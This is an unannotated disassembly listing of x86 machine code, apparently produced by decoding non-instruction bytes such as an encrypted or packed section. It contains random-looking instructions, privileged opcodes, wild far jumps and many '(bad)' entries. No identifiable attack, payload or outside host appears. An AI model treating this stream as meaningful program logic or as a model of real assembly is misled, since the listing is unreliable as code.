  40aa67:	mov    cl,0xae
  40aa69:	sub    esp,DWORD PTR [esi]
  40aa6b:	lock outs dx,DWORD PTR ds:[esi]
  40aa6d:	dec    esp
  40aa6e:	xor    ecx,ebp
  40aa70:	sbb    bh,BYTE PTR [edx]
  40aa72:	mov    ebx,DWORD PTR [edx]
  40aa74:	add    DWORD PTR [edx-0x40],esi
  40aa77:	xor    DWORD PTR [edx-0x16a5f8c8],esp
  40aa7d:	arpl   di,si
  40aa7f:	out    0xa6,eax
  40aa81:	rcl    ecx,cl
  40aa83:	xor    BYTE PTR [ebp-0x3d],ah
  40aa86:	dec    ebp
  40aa87:	add    dh,dl
  40aa89:	call   0xf43756a4
  40aa8e:	xor    DWORD PTR [ebx-0x6d],esi
  40aa91:	nop
  40aa92:	cdq    
  40aa93:	push   ecx
  40aa94:	lahf   
  40aa95:	loopne 0x40aa88
  40aa97:	mov    ch,0x18
  40aa99:	div    ch
  40aa9b:	sub    eax,0xfc3c792b
  40aaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa1:	adc    dl,0xb2
  40aaa4:	jbe    0x40aa7e
  40aaa6:	lods   eax,DWORD PTR ds:[esi]
  40aaa7:	dec    ecx
  40aaa8:	bnd jmp 0x40aa38
  40aaab:	call   0xbdc9:0x842830e1
  40aab2:	jno    0x40ab13
  40aab4:	or     bh,BYTE PTR [ecx+0x6f]
  40aab7:	pop    ecx
  40aab8:	jnp    0x40aa6e
  40aaba:	iret   
  40aabb:	pusha  
  40aabc:	dec    edx
  40aabd:	inc    eax
  40aabe:	data16 mov bh,0x9a
  40aac1:	aad    0xbe
  40aac3:	lods   eax,DWORD PTR ds:[esi]
  40aac4:	dec    eax
  40aac5:	retf   0xf8da
  40aac8:	imul   ebp,ebp,0xffffff94
  40aacb:	fst    DWORD PTR [edx+edi*1+0x3e6cb993]
  40aad2:	pop    ebx
  40aad3:	dec    edi
  40aad4:	adc    BYTE PTR [edx],dl
  40aad6:	push   ss
  40aad7:	inc    edx
  40aad8:	cld    
  40aad9:	push   edx
  40aada:	mov    esp,0x63f1fa8c
  40aadf:	mov    ecx,0x6ac89075
  40aae4:	mov    ch,0x3b
  40aae6:	ror    DWORD PTR [ebx+0x2d0aef19],cl
  40aaec:	mov    BYTE PTR [eax+0x736254e1],dh
  40aaf2:	iret   
  40aaf3:	mov    al,0xa6
  40aaf5:	ret    0xc86a
  40aaf8:	adc    BYTE PTR [ebp-0x40],ah
  40aafb:	pop    ds
  40aafc:	jae    0x40aa89
  40aafe:	sbb    esi,ecx
  40ab00:	pushf  
  40ab01:	out    0xf,eax
  40ab03:	popa   
  40ab04:	int    0xf8
  40ab06:	jne    0x40aaab
  40ab08:	sbb    BYTE PTR [eax+0x48],ah
  40ab0b:	mov    al,ds:0x956e8d13
  40ab10:	push   ebp
  40ab11:	out    0x2a,eax
  40ab13:	fnsave [eax-0x4f]
  40ab16:	sub    cl,bh
  40ab18:	jmp    esi
  40ab1a:	mov    bl,0x5e
  40ab1c:	imul   esi,DWORD PTR [eax+0x39],0x1b8f68ac
  40ab23:	sub    al,0xc5
  40ab25:	cvtpi2ps xmm5,QWORD PTR [esi]
  40ab28:	ins    BYTE PTR es:[edi],dx
  40ab29:	leave  
  40ab2a:	or     al,0xe4
  40ab2c:	push   ds
  40ab2d:	jmp    0x78a026db
  40ab32:	sub    eax,0x5f6456c3
  40ab37:	sub    BYTE PTR ss:[esi],0xfd
  40ab3b:	icebp  
  40ab3c:	adc    DWORD PTR [ecx],ecx
  40ab3e:	or     al,0x9e
  40ab40:	std    
  40ab41:	mov    WORD PTR [ebx+ecx*1],ds
  40ab44:	add    eax,0xa2dcbd4c
  40ab49:	sar    DWORD PTR [edx+0x9e0d84c],0xac
  40ab50:	leave  
  40ab51:	jmp    0x3519dfb2
  40ab56:	sub    ecx,ebp
  40ab58:	(bad)  
  40ab59:	push   ebx
  40ab5a:	imul   edi,DWORD PTR [ebp-0x19569a6],0xa73bd333
  40ab64:	bound  esp,QWORD PTR [esi-0x7d]
  40ab67:	xchg   ebp,eax
  40ab68:	in     eax,0xac
  40ab6a:	repnz dec eax
  40ab6c:	out    0x3e,al
  40ab6e:	or     eax,0xd812449a
  40ab73:	add    bl,ah
  40ab75:	and    BYTE PTR [esi+edx*1+0x64],0x86
  40ab7a:	jl     0x40ab31
  40ab7c:	jmp    0x18bc:0x4e72cd5d
  40ab83:	mov    dh,BYTE PTR [ecx]
  40ab85:	stc    
  40ab86:	pop    ecx
  40ab87:	or     al,0xa0
  40ab89:	stos   BYTE PTR es:[edi],al
  40ab8a:	and    eax,0x25f5f790
  40ab8f:	mov    dl,0x99
  40ab91:	jg     0x40abf6
  40ab93:	dec    esp
  40ab94:	jg     0x40abef
  40ab96:	inc    edx
  40ab97:	out    dx,eax
  40ab98:	imul   esp,edi,0xffffffc5
  40ab9b:	test   eax,0xe5c84488
  40aba0:	hlt    
  40aba1:	mov    cl,0xc9
  40aba3:	test   DWORD PTR [ebp+esi*4-0x174f2ea1],0x9dfd2da2
  40abae:	mov    fs,WORD PTR [edx+eax*2]
  40abb1:	rol    DWORD PTR [edx+0x5d5446ae],1
  40abb7:	out    0xbb,al
  40abb9:	aas    
  40abba:	or     dl,BYTE PTR ds:0xe111a1f8
  40abc0:	adc    edi,DWORD PTR [eax]
  40abc2:	ins    DWORD PTR es:[edi],dx
  40abc3:	mov    ecx,0x23460a24
  40abc8:	xchg   edx,eax
  40abc9:	mov    eax,DWORD PTR [ecx-0x3d935a64]
  40abcf:	cmp    al,0x18
  40abd1:	mov    eax,0xb9a3035c
  40abd6:	das    
  40abd7:	inc    esi
  40abd8:	and    eax,0x2c6250d2
  40abdd:	push   esi
  40abde:	psrld  mm6,QWORD PTR [ebx+0x57]
  40abe2:	daa    
  40abe3:	push   ds
  40abe4:	in     eax,dx
  40abe5:	dec    edi
  40abe6:	scas   eax,DWORD PTR es:[edi]
  40abe7:	loop   0x40ac4d
  40abe9:	fidiv  DWORD PTR [eax-0x7db8cbbd]
  40abef:	fstp   TBYTE PTR [esi]
  40abf1:	ror    BYTE PTR [ebx],0xcd
  40abf4:	mov    ah,0x62
  40abf6:	xchg   ebx,eax
  40abf7:	scas   al,BYTE PTR es:[edi]
  40abf8:	push   ss
  40abf9:	lea    esp,[esi+0x27badd78]
  40abff:	data16 add bh,bh
  40ac02:	loop   0x40ac7f
  40ac04:	test   al,0xcf
  40ac06:	div    BYTE PTR [ecx-0x6]
  40ac09:	cmc    
  40ac0a:	mul    ch
  40ac0c:	test   bl,bh
  40ac0e:	xchg   BYTE PTR [eax+ecx*4+0x19cae7d],dl
  40ac15:	pop    esp
  40ac16:	jl     0x40ab9d
  40ac18:	mov    al,0x56
  40ac1a:	cli    
  40ac1b:	loope  0x40abcb
  40ac1d:	dec    edx
  40ac1e:	loope  0x40ac29
  40ac20:	cmp    edi,eax
  40ac22:	es test eax,0xcf3a5ab1
  40ac28:	jb     0x40ac40
  40ac2a:	mov    ecx,0xfed3858a
  40ac2f:	stos   DWORD PTR es:[edi],eax
  40ac30:	pusha  
  40ac31:	mov    BYTE PTR [eax+0x58],dl
  40ac34:	pushf  
  40ac35:	bound  ecx,QWORD PTR [edi]
  40ac37:	push   es
  40ac38:	pop    ds
  40ac39:	xchg   esp,eax
  40ac3a:	pop    ss
  40ac3b:	push   ebp
  40ac3c:	add    ebx,DWORD PTR [eax+0x6f0a7d3c]
  40ac42:	aas    
  40ac43:	out    0xe4,eax
  40ac45:	imul   edi,esp,0x4a54e85f
  40ac4b:	ins    DWORD PTR es:[edi],dx
  40ac4c:	push   ecx
  40ac4d:	sub    edx,DWORD PTR [ebx]
  40ac4f:	mov    ?,WORD PTR [edx-0x5c]
  40ac52:	push   ebx
  40ac53:	dec    edi
  40ac54:	mov    ch,0xb2
  40ac56:	or     edx,DWORD PTR [edx+0xf]
  40ac59:	loopne 0x40abfa
  40ac5b:	xchg   edx,eax
  40ac5c:	fucomip st,st(3)
  40ac5e:	push   cs
  40ac5f:	aam    0xed
  40ac61:	mov    ah,0xe3
  40ac63:	dec    edi
  40ac64:	or     eax,0x45a15371
  40ac69:	mov    ebx,ecx
  40ac6b:	repz and DWORD PTR [esi],ecx
  40ac6e:	pop    ebp
  40ac6f:	or     bl,cl
  40ac71:	jmp    0xe2d5c818
  40ac76:	arpl   WORD PTR [edx],cx
  40ac78:	test   al,0xea
  40ac7a:	push   0xde4fde64
  40ac7f:	mov    edi,0xc72e2643
  40ac84:	add    ch,BYTE PTR [edx-0x3ab49a98]
  40ac8a:	rol    DWORD PTR [ecx-0x4ba34193],1
  40ac90:	mov    ds:0xb7058a18,eax
  40ac95:	add    al,0xaa
  40ac97:	in     eax,dx
  40ac98:	popa   
  40ac99:	addr16 push eax
  40ac9b:	push   cs
  40ac9c:	cdq    
  40ac9d:	scas   eax,DWORD PTR es:[edi]
  40ac9e:	scas   eax,DWORD PTR es:[edi]
  40ac9f:	pop    esi
  40aca0:	xlat   BYTE PTR ds:[ebx]
  40aca1:	in     al,dx
  40aca2:	cmp    BYTE PTR [eax+edi*4-0x79c783af],ch
  40aca9:	iret   
  40acaa:	xor    al,0xe3
  40acac:	hlt    
  40acad:	add    dh,al
  40acaf:	sub    eax,0xdbb593c1
  40acb4:	jno    0x40aca9
  40acb6:	hlt    
  40acb7:	scas   eax,DWORD PTR es:[edi]
  40acb8:	pusha  
  40acb9:	sti    
  40acba:	pop    eax
  40acbb:	mov    bl,BYTE PTR [eax-0x3ae18a35]
  40acc1:	std    
  40acc2:	stos   DWORD PTR es:[edi],eax
  40acc3:	stos   DWORD PTR es:[edi],eax
  40acc4:	mov    eax,ds:0xd04fc8cc
  40acc9:	enter  0x31b2,0xc2
  40accd:	daa    
  40acce:	push   ecx
  40accf:	inc    ecx
  40acd0:	add    al,0x4f
  40acd2:	(bad)  
  40acd3:	fnstcw WORD PTR [eax]
  40acd5:	ret    
  40acd6:	fld    DWORD PTR [edx]
  40acd8:	arpl   di,dx
  40acda:	dec    ecx
  40acdb:	iret   
  40acdc:	and    dh,cl
  40acde:	scas   al,BYTE PTR es:[edi]
  40acdf:	in     al,0xc4
  40ace1:	mov    ds,WORD PTR [edi-0x9]
  40ace4:	dec    esi
  40ace5:	push   eax
  40ace6:	out    0x5a,al
  40ace8:	dec    BYTE PTR [ecx+0x1e7bb77e]
  40acee:	push   cs
  40acef:	mov    eax,ds:0xde9ba06e
  40acf4:	push   0xc
  40acf6:	lods   eax,DWORD PTR ds:[esi]
  40acf7:	push   ebx
  40acf8:	mov    gs,WORD PTR [ecx-0x6a]
  40acfb:	xchg   esi,eax
  40acfc:	icebp  
  40acfd:	add    al,0xe6
  40acff:	cmp    BYTE PTR [edx+eax*4],cl
  40ad02:	jp     0x40ad59
  40ad04:	or     bl,BYTE PTR [eax]
  40ad06:	or     BYTE PTR [ecx+0x41],0x0
  40ad0a:	sub    eax,0x9b312456
  40ad0f:	pop    edi
  40ad10:	enter  0xbba4,0x93
  40ad14:	mov    ebx,0x55cff5f3
  40ad19:	je     0x40ad35
  40ad1b:	out    0x58,eax
  40ad1d:	popf   
  40ad1e:	scas   eax,DWORD PTR es:[edi]
  40ad1f:	jp     0x40ad66
  40ad21:	outs   dx,DWORD PTR ds:[esi]
  40ad22:	dec    ecx
  40ad23:	push   ebx
  40ad24:	xchg   DWORD PTR [esp+edx*2],esi
  40ad27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad28:	push   edx
  40ad29:	xchg   esp,eax
  40ad2a:	mov    cl,0x80
  40ad2c:	inc    ebx
  40ad2d:	pop    ds
  40ad2e:	arpl   WORD PTR [esi+ecx*1-0x44],bx
  40ad32:	pop    esp
  40ad33:	lds    esp,FWORD PTR [ebx+eiz*1]
  40ad36:	jmp    0xb51bc00f
  40ad3b:	imul   ebp,DWORD PTR [edi+0x68],0xffffff92
  40ad3f:	xor    BYTE PTR [ecx-0x3d],ch
  40ad42:	ins    DWORD PTR es:[edi],dx
  40ad43:	add    ecx,edi
  40ad45:	dec    esp
  40ad46:	push   edx
  40ad47:	push   ecx
  40ad48:	xchg   edi,eax
  40ad49:	icebp  
  40ad4a:	mov    edx,ebp
  40ad4c:	into   
  40ad4d:	or     eax,0xddd93289
  40ad52:	test   DWORD PTR [ebx],eax
  40ad54:	leave  
  40ad55:	jp     0x40ad72
  40ad57:	jge    0x40ad6b
  40ad59:	iret   
  40ad5a:	out    dx,al
  40ad5b:	imul   edx,DWORD PTR [edi+0x3e470b36],0x50ef5458
  40ad65:	test   al,0x4a
  40ad67:	xor    al,BYTE PTR [ebp+0x5c]
  40ad6a:	xor    eax,0xf78c72f3
  40ad6f:	loopne 0x40ad39
  40ad71:	xchg   esp,eax
  40ad72:	push   esi
  40ad73:	out    dx,eax
  40ad74:	mov    bh,0xd4
  40ad76:	(bad)  
  40ad77:	push   esp
  40ad78:	lea    ecx,[ebp-0x49]
  40ad7b:	lea    ecx,[eax]
  40ad7d:	or     al,dh
  40ad7f:	inc    esi
  40ad80:	pop    esi
  40ad81:	daa    
  40ad82:	call   0x5c1e:0x689f5db8
  40ad89:	aam    0xbd
  40ad8b:	inc    ebx
  40ad8c:	dec    esp
  40ad8d:	xor    al,0xb4
  40ad8f:	inc    ebp
  40ad90:	mov    ecx,esp
  40ad92:	sub    BYTE PTR [ebp-0x33abd9e1],al
  40ad98:	ja     0x40ada5
  40ad9a:	aad    0x1a
  40ad9c:	adc    bh,cl
  40ad9e:	sub    al,BYTE PTR [esi-0x73]
  40ada1:	sub    eax,0xc0ffc32e
  40ada6:	fwait
  40ada7:	ss pop ebp
  40ada9:	adc    edi,esi
  40adab:	std    
  40adac:	out    0xc0,eax
  40adae:	outs   dx,DWORD PTR ds:[esi]
  40adaf:	inc    eax
  40adb0:	(bad)  [eax+eiz*4-0x613798ea]
  40adb7:	jns    0x40ada2
  40adb9:	mov    ch,0x91
  40adbb:	cmp    al,0x59
  40adbd:	shr    DWORD PTR [ebx+0x4],1
  40adc0:	dec    esp
  40adc1:	pop    ebx
  40adc2:	push   ebx
  40adc3:	xchg   esp,eax
  40adc4:	sub    al,0xca
  40adc6:	xchg   DWORD PTR [edx],ebp
  40adc8:	test   BYTE PTR [edx+0x482dceb5],dl
  40adce:	and    eax,DWORD PTR [esi+0x12]
  40add1:	push   eax
  40add2:	jge    0x40ad9a
  40add4:	lds    eax,FWORD PTR [edi+0x3da651e7]
  40adda:	xor    DWORD PTR [eax-0x6d],edx
  40addd:	cmp    edi,DWORD PTR [edx-0x6a]
  40ade0:	push   ebp
  40ade1:	add    eax,0x9ddbee76
  40ade6:	dec    esi
  40ade7:	test   eax,0x5a3a8761
  40adec:	adc    DWORD PTR [ebx],0xffffffa5
  40adef:	jg     0x40ade6
  40adf1:	xchg   esi,eax
  40adf2:	mov    ecx,0xc8be1a28
  40adf7:	xchg   edi,eax
  40adf8:	jg     0x40ad84
  40adfa:	xlat   BYTE PTR ds:[ebx]
  40adfb:	retf   
  40adfc:	jmp    0xe601:0x3bd21e2c
  40ae03:	sbb    cl,BYTE PTR [edx+edi*4-0x1f4c2e60]
  40ae0a:	pop    edi
  40ae0b:	push   ecx
  40ae0c:	xor    esi,DWORD PTR [edi]
  40ae0e:	or     eax,0xe6e16a2e
  40ae13:	in     eax,0xd9
  40ae15:	sbb    BYTE PTR [eax+esi*4],ah
  40ae18:	or     DWORD PTR [eax-0x6e45eac7],ebp
  40ae1e:	lods   eax,DWORD PTR ds:[esi]
  40ae1f:	sti    
  40ae20:	les    eax,FWORD PTR [edx+0x47]
  40ae23:	cld    
  40ae24:	mov    ch,0xa2
  40ae26:	mov    ds:0x5b06454,eax
  40ae2b:	lds    esi,FWORD PTR [edx-0x29272a93]
  40ae31:	push   esi
  40ae32:	and    bl,cl
  40ae34:	arpl   WORD PTR [ecx],bx
  40ae36:	xchg   ebp,eax
  40ae37:	and    eax,0xea068d6d
  40ae3c:	xchg   esp,eax
  40ae3d:	xchg   ebp,eax
  40ae3e:	sbb    bh,ah
  40ae40:	dec    ecx
  40ae41:	mov    WORD PTR [ebx-0x4e54882e],cs
  40ae47:	adc    al,0xa9
  40ae49:	fwait
  40ae4a:	adc    dl,BYTE PTR [edx]
  40ae4c:	xor    eax,0x35b42ca8
  40ae52:	aad    0xfc
  40ae54:	mov    edi,ebx
  40ae56:	jp     0x40ae7c
  40ae58:	mov    ds:0x7debb57d,eax
  40ae5d:	push   ecx
  40ae5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae5f:	cmp    ebp,ecx
  40ae61:	outs   dx,DWORD PTR ds:[esi]
  40ae62:	sahf   
  40ae63:	sahf   
  40ae64:	or     bh,BYTE PTR ds:0xfa9b99d9
  40ae6a:	adc    bl,dl
  40ae6c:	pop    es
  40ae6d:	xor    al,0xa
  40ae6f:	jg     0x40ae8b
  40ae71:	inc    edi
  40ae72:	cmp    esi,esi
  40ae74:	pop    esp
  40ae75:	in     al,dx
  40ae76:	ds push 0xffffff8a
  40ae79:	xor    esp,DWORD PTR [ebp-0x19c41ed3]
  40ae7f:	mov    ecx,0xee686fc2
  40ae84:	mov    bl,0x7d
  40ae86:	call   0xa69e51a7
  40ae8b:	mov    bh,0xb6
  40ae8d:	mov    dl,BYTE PTR [ebx+0x32]
  40ae90:	mov    bl,0xea
  40ae92:	scas   eax,DWORD PTR es:[edi]
  40ae93:	ret    
  40ae94:	pop    esp
  40ae95:	fadd   st,st(0)
  40ae97:	sbb    DWORD PTR [esp+eiz*8],ebx
  40ae9a:	inc    esp
  40ae9b:	sahf   
  40ae9c:	daa    
  40ae9d:	add    dh,BYTE PTR [ebp+0x37]
  40aea0:	ja     0x40aefe
  40aea2:	push   ebx
  40aea3:	daa    
  40aea4:	(bad)
  40aea7:	jnp    0x40af04
  40aea9:	and    DWORD PTR [eax],0x79
  40aeac:	popa   
  40aead:	push   0xffffffd6
  40aeaf:	fistp  WORD PTR [esi+0x24]
  40aeb2:	daa    
  40aeb3:	jl     0x40af32
  40aeb5:	js     0x40ae91
  40aeb7:	xchg   ebx,eax
  40aeb8:	fwait
  40aeb9:	jecxz  0x40ae40
  40aebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aebc:	sub    edx,edi
  40aebe:	dec    edi
  40aebf:	xchg   esp,ebx
  40aec1:	push   ebx
  40aec2:	fs ja  0x40af26
  40aec5:	leave  
  40aec6:	xchg   esi,eax
  40aec7:	fsubr  QWORD PTR [ebx+edx*4-0x44]
  40aecb:	in     eax,dx
  40aecc:	dec    ecx
  40aecd:	or     dl,BYTE PTR [esi+0x7c21cd4d]
  40aed3:	cmp    DWORD PTR [edi+0x17ec5df3],0xfb6f6463
  40aedd:	popf   
  40aede:	mov    dh,0x6
  40aee0:	mov    cl,0xca
  40aee2:	or     DWORD PTR [ecx+0x56f2451c],0xffffff8c
  40aee9:	jo     0x40aee1
  40aeeb:	sub    ch,BYTE PTR [eax-0x32fd05c9]
  40aef1:	cmp    DWORD PTR [ebx],esp
  40aef3:	fistp  QWORD PTR [edi]
  40aef5:	push   es
  40aef6:	mov    esp,0xd4bf568
  40aefb:	stos   DWORD PTR es:[edi],eax
  40aefc:	sti    
  40aefd:	xchg   esi,eax
  40aefe:	add    ch,BYTE PTR [ebp-0x528dc83c]
  40af04:	pop    esp
  40af05:	mov    esi,0xc572a5e8
  40af0a:	push   edi
  40af0b:	mov    dh,0xe2
  40af0d:	enter  0xfcbc,0xbd
  40af11:	ins    DWORD PTR es:[edi],dx
  40af12:	lock psubsb mm1,QWORD PTR [ecx-0x39]
  40af17:	fistp  WORD PTR [ebp+0x6858b981]
  40af1d:	adc    BYTE PTR [eax+0x3b],dl
  40af20:	call   FWORD PTR [eax-0x1767f2f1]
  40af26:	mov    ebx,0x407a5efe
  40af2b:	retf   0x1d46
  40af2e:	js     0x40afa2
  40af30:	add    ebp,DWORD PTR [esi+eiz*2+0x75cd5ff4]
  40af37:	cdq    
  40af38:	and    ebp,edx
  40af3a:	xor    DWORD PTR [edx-0x52],esi
  40af3d:	xabort 0x52
  40af40:	jle    0x40af3d
  40af42:	sub    ch,BYTE PTR [ebx-0x75a54c56]
  40af48:	aad    0x7e
  40af4a:	push   eax
  40af4b:	inc    ebp
  40af4c:	int    0xb4
  40af4e:	pinsrw mm0,ecx,0xe8
  40af52:	lods   al,BYTE PTR ds:[si]
  40af54:	push   edx
  40af55:	not    DWORD PTR [esi]
  40af57:	pop    ebx
  40af58:	call   0x8c2c:0x64030d92
  40af5f:	into   
  40af60:	loop   0x40afd5
  40af62:	(bad)  
  40af63:	stos   BYTE PTR es:[edi],al
  40af64:	stos   BYTE PTR es:[edi],al
  40af65:	xchg   BYTE PTR [edi-0x36],bh
  40af68:	das    
  40af69:	dec    esp
  40af6a:	mov    edx,0x4f295a31
  40af6f:	cmp    bl,bh
  40af71:	jp     0x40afef
  40af73:	leave  
  40af74:	gs sti 
  40af76:	into   
  40af77:	imul   edi,ebx,0x3e
  40af7a:	scas   al,BYTE PTR es:[edi]
  40af7b:	xor    bh,BYTE PTR [edi-0x2d977005]
  40af81:	cmp    al,BYTE PTR [esi-0x2aaa529b]
  40af87:	cwde   
  40af88:	push   0x83da8aa
  40af8d:	dec    ecx
  40af8e:	std    
  40af8f:	sub    BYTE PTR [edx-0x6b],0x98
  40af93:	or     cl,BYTE PTR [esi+0x33]
  40af96:	iret   
  40af97:	call   0x44421ebd
  40af9c:	std    
  40af9d:	xchg   ebp,eax
  40af9e:	pop    edi
  40af9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa0:	sahf   
  40afa1:	mov    BYTE PTR [ebx-0x69],ch
  40afa4:	in     al,dx
  40afa5:	xchg   ebx,eax
  40afa6:	mov    ds:0xc3d5e6bc,eax
  40afab:	adc    edi,DWORD PTR ds:0xe8f706f2
  40afb1:	sub    ebp,DWORD PTR [ecx]
  40afb3:	or     BYTE PTR [edi-0x1dc05304],ah
  40afb9:	push   esi
  40afba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afbb:	xchg   esp,eax
  40afbc:	adc    ebx,DWORD PTR [ebx+ebp*1-0x64]
  40afc0:	cdq    
  40afc1:	xchg   BYTE PTR [ebp-0x3f786325],ch
  40afc7:	jmp    0x84aa:0xdb383320
  40afce:	sub    DWORD PTR [edi],edx
  40afd0:	mov    ds:0x89b5eb67,al
  40afd5:	xchg   edi,eax
  40afd6:	inc    ebx
  40afd7:	adc    BYTE PTR [eax],0xe5
  40afda:	push   eax
  40afdb:	jo     0x40b00b
  40afdd:	mov    al,0xd7
  40afdf:	ret    
  40afe0:	push   es
  40afe1:	mov    al,0x4c
  40afe3:	or     ah,BYTE PTR [bp+di]
  40afe6:	xchg   edx,eax
  40afe7:	jb     0x40afb4
  40afe9:	pop    ds
  40afea:	mov    BYTE PTR [edi+ebx*4+0x6142d64],ch
  40aff1:	cld    
  40aff2:	xor    ebp,ecx
  40aff4:	add    al,0x26
  40aff6:	or     dl,al
  40aff8:	rcl    bl,1
  40affa:	or     edi,edx
  40affc:	retf   
  40affd:	push   es
  40affe:	inc    ecx
  40afff:	fwait
  40b000:	sub    DWORD PTR [edi],0x68e3aa95
  40b006:	jne    0x40b070
  40b008:	aaa    
  40b009:	shl    BYTE PTR [edi+edi*1+0x361e03e7],cl
  40b010:	push   ebx
  40b011:	add    DWORD PTR [ebx+eax*2+0x59],edi
  40b015:	in     al,0xa4
  40b017:	push   ecx
  40b018:	test   DWORD PTR [eax+0x58],ebp
  40b01b:	cs imul edx,edi,0x9cca5837
  40b022:	test   DWORD PTR [ebx-0x3f66daa8],edx
  40b028:	sub    bh,0xee
  40b02b:	bound  eax,QWORD PTR [eax]
  40b02d:	test   dh,cl
  40b02f:	push   edi
  40b030:	cmp    BYTE PTR [edx+0x45],bh
  40b033:	ret    0x5f66
  40b036:	pop    ss
  40b037:	stc    
  40b038:	push   0x96187dfa
  40b03d:	cmp    DWORD PTR [eax+esi*1-0xd7b13e7],edx
  40b044:	mov    ebx,0xaf78c897
  40b049:	lods   eax,DWORD PTR ds:[esi]
  40b04a:	mov    bl,0xe6
  40b04c:	lds    esp,FWORD PTR [ecx]
  40b04e:	mov    WORD PTR [ecx-0x35c3921b],gs
  40b054:	adc    eax,0x9b6fcf3e
  40b059:	add    dl,dl
  40b05b:	es ja  0x40b050
  40b05e:	xor    ch,BYTE PTR [edx+0x1cb92dd5]
  40b064:	pop    edx
  40b065:	push   esi
  40b066:	mov    ebp,0x6e73badc
  40b06b:	lea    esp,[ecx]
  40b06d:	dec    ebx
  40b06e:	int3   
  40b06f:	jle    0x40b0c0
  40b071:	rcr    DWORD PTR [ebx],cl
  40b073:	mov    WORD PTR [ecx+0x6e],ss
  40b076:	lock add eax,0xeb58e950
  40b07c:	push   ecx
  40b07d:	push   ecx
  40b07e:	xchg   edx,eax
  40b07f:	adc    edx,DWORD PTR [eax-0x62]
  40b082:	js     0x40b07c
  40b084:	push   es
  40b085:	stos   BYTE PTR es:[edi],al
  40b086:	ins    BYTE PTR es:[edi],dx
  40b087:	jnp    0x40b0d0
  40b089:	je     0x40b0d0
  40b08b:	jb     0x40b020
  40b08d:	nop
  40b08e:	ret    
  40b08f:	push   edx
  40b090:	das    
  40b091:	popf   
  40b092:	pushf  
  40b093:	enter  0xa7eb,0x2e
  40b097:	adc    cl,BYTE PTR [esi]
  40b099:	cs je  0x40b058
  40b09c:	inc    ebx
  40b09d:	xchg   edi,edx
  40b09f:	dec    esp
  40b0a0:	jle    0x40b03a
  40b0a2:	mov    al,ds:0xea4b6ad8
  40b0a7:	and    bh,BYTE PTR [ecx+0x4daadef0]
  40b0ad:	inc    eax
  40b0ae:	push   0xf3a0315f
  40b0b3:	cmp    eax,0x24eb80b2
  40b0b8:	leave  
  40b0b9:	sub    DWORD PTR [ecx],0xc1f3301e
  40b0bf:	add    eax,DWORD PTR [edi-0x3b]
  40b0c2:	jno    0x40b068
  40b0c4:	inc    ebp
  40b0c5:	pop    eax
  40b0c6:	div    DWORD PTR [edi+0x6f21c09b]
  40b0cc:	(bad)  
  40b0cd:	cs aad 0xe4
  40b0d0:	jns    0x40b114
  40b0d2:	mov    ch,0x4b
  40b0d4:	gs mov edi,0xd7d9bf4f
  40b0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0db:	or     al,0xb8
  40b0dd:	push   ebx
  40b0de:	test   al,0xeb
  40b0e0:	jle    0x40b0c9
  40b0e2:	ja     0x40b103
  40b0e4:	cs clc 
  40b0e6:	xchg   ecx,eax
  40b0e7:	outs   dx,DWORD PTR ds:[esi]
  40b0e8:	inc    edi
  40b0e9:	mov    dh,0x71
  40b0eb:	pop    edx
  40b0ec:	lahf   
  40b0ed:	sar    BYTE PTR [ebx+ecx*2],0xdc
  40b0f1:	push   ds
  40b0f2:	adc    ebp,DWORD PTR [edi+0x626ce13d]
  40b0f8:	add    eax,0xed069a4
  40b0fd:	push   ds
  40b0fe:	idiv   BYTE PTR [edx+0x1f]
  40b101:	aad    0x4e
  40b103:	stos   DWORD PTR es:[edi],eax
  40b104:	(bad)  
  40b105:	es mov ah,0xc1
  40b108:	mov    cl,0xec
  40b10a:	rol    DWORD PTR [ecx],1
  40b10c:	retf   
  40b10d:	inc    edi
  40b10e:	std    
  40b10f:	outs   dx,BYTE PTR ds:[esi]
  40b110:	int3   
  40b111:	inc    edi
  40b112:	fadd   QWORD PTR [edx+0x6c7af9d9]
  40b118:	lods   al,BYTE PTR ds:[esi]
  40b119:	repnz retf 
  40b11b:	not    DWORD PTR ds:[ebx-0x42]
  40b11f:	std    
  40b120:	jb     0x40b19c
  40b122:	outs   dx,BYTE PTR ds:[esi]
  40b123:	and    eax,0xc3b92d03
  40b128:	outs   dx,DWORD PTR ds:[esi]
  40b129:	jno    0x40b15c
  40b12b:	vpcmpeqw ymm5,ymm6,ymm5
  40b12f:	mov    ah,BYTE PTR [ebp+0x3c4ac82d]
  40b135:	lea    esp,[ecx+0x3c09caf]
  40b13b:	dec    esp
  40b13c:	push   esp
  40b13d:	sti    
  40b13e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b13f:	cmp    eax,0x568a90d9
  40b144:	fimul  WORD PTR [ecx-0x20]
  40b147:	cmc    
  40b148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b149:	sub    ch,BYTE PTR [esi+0x2441475d]
  40b14f:	ret    0xfe1e
  40b152:	gs pop esp
  40b154:	pop    edi
  40b155:	hlt    
  40b156:	clc    
  40b157:	cdq    
  40b158:	xchg   ebp,eax
  40b159:	scas   al,BYTE PTR es:[edi]
  40b15a:	add    al,0x15
  40b15c:	add    ebp,edi
  40b15e:	sbb    ch,BYTE PTR ds:0x4abc1ad1
  40b164:	cmc    
  40b165:	pop    edx
  40b166:	dec    eax
  40b167:	mov    edx,0xd4e80157
  40b16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b16d:	ins    DWORD PTR es:[edi],dx
  40b16e:	cmp    eax,0x78978c38
  40b173:	mov    esi,0x6b873608
  40b178:	mov    ebp,0xe2c52d04
  40b17d:	pop    dx
  40b17f:	xchg   esi,eax
  40b180:	fwait
  40b181:	sub    BYTE PTR [ebx-0x19],dl
  40b184:	add    BYTE PTR ds:0xd4f27c9c,0x15
  40b18b:	cs sub al,0xcc
  40b18e:	or     ecx,DWORD PTR [eax+0x7e]
  40b191:	jns    0x40b115
  40b193:	mov    eax,ds:0x8bd6e50c
  40b198:	inc    ebp
  40b199:	sbb    BYTE PTR [ebx+0x46891075],cl
  40b19f:	or     al,0x8b
  40b1a1:	inc    ebp
  40b1a2:	sbb    al,0x8b
